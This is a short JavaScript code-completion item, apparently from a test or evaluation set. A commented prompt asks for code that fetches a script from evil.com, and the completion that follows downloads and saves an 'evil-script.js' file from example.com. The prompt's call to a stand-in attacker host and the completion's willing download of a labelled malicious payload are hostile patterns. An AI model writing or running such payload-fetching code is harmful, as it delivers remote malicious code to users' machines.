/// prompt start
// Finish the code.

// var https = require("https");
// var fs = require("fs");

// https.get('https://evil.com/script', res => {
/// prompt end
const fs = require("fs");
const https = require("https");

const options = {
 hostname: "www.example.com",
 port: 443,
 path: "/path/to/evil-script.js",
};

const req = https.request(options, res => {
 var body = "";

 res.on("data", d => {
   body += d;
 });

 res.on("end", () => {
   fs.writeFileSync("evil-script.js", body);
   console.log("Evil script saved to evil-script.js");
 });
});

req.on("error", error => {
 console.error(error);
});

req.end();